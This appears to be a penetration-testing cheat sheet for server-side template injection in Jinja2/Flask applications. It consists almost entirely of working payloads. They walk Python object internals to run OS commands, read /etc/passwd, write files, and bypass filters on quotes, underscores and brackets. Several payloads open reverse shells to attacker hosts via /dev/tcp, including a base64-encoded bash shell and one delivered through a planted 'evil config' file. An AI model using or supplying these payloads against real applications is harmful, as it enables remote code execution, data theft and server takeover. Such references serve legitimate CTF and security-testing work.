<pre>

{% debug %}


</pre>
{{ config }} #In these object you can find all the configured env variables


{% for key, value in config.items() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}

# To access a class object
[].__class__
''.__class__
()["__class__"] # You can also access attributes like this
request["__class__"]
config.__class__
dict #It's already a class

# From a class to access the class "object". 
## "dict" used as example from the previous list:
dict.__base__
dict["__base__"]
dict.mro()[-1]
dict.__mro__[-1]
(dict|attr("__mro__"))[-1]
(dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]

# From the "object" class call __subclasses__()
{{ dict.__base__.__subclasses__() }}
{{ dict.mro()[-1].__subclasses__() }}
{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}

{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}

# Other examples using these ways
{{ ().__class__.__base__.__subclasses__() }}
{{ [].__class__.__mro__[-1].__subclasses__() }}
{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
{{ request.__class__.mro()[-1].__subclasses__() }}
{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}



# Not sure if this will work, but I saw it somewhere
{{ [].class.base.subclasses() }}
{{ ''.class.mro()[1].subclasses() }}
# ''.__class__.__mro__[1].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
# The class 396 is the class <class 'subprocess.Popen'>
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}

# Without '{{' and '}}'

<div data-gb-custom-block data-tag="if" data-0='application' data-1='][' data-2='][' data-3='__globals__' data-4='][' data-5='__builtins__' data-6='__import__' data-7='](' data-8='os' data-9='popen' data-10='](' data-11='id' data-12='read' data-13=']() == ' data-14='chiv'> a </div>

# Calling os.popen without guessing the index of the class
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}

## Passing the cmd line in a GET param
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}


## Passing the cmd line ?cmd=id, Without " and ' 
{{ dict.mro()[-1].__subclasses__()[276](request.args.cmd,shell=True,stdout=-1).communicate()[0].strip() }}

# Without quotes, _, [, ]
## Basic ones
request.__class__
request["__class__"]
request['\x5f\x5fclass\x5f\x5f']
request|attr("__class__")
request|attr(["_"*2, "class", "_"*2]|join) # Join trick

## Using request object options
request|attr(request.headers.c) #Send a header like "c: __class__" (any trick using get params can be used with headers also)
request|attr(request.args.c) #Send a param like "?c=__class__
request|attr(request.query_string[2:16].decode() #Send a param like "?c=__class__
request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join) # Join list to string
http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ #Formatting the string from get params

## Lists without "[" and "]"
http://localhost:5000/?c={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_

# Using with

{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}

# evil config
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} 

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}

# Read file
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}

# RCE
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
{{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
{{ (config|attr("__class__")).from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}

{{ request.__class__.__dict__ }}
- application
- _load_form_data
- on_json_loading_failed

{{ config.__class__.__dict__ }}
- __init__
- from_envvar
- from_pyfile
- from_object
- from_file
- from_json
- from_mapping
- get_namespace
- __repr__

# You can iterate through children objects to find more

{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ls")["read"]() %} {{ a }} {% endwith %}

## Extra
## The global from config have a access to a function called import_string
## with this function you don't need to access the builtins
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}

# All the bypasses seen in the previous sections are also valid
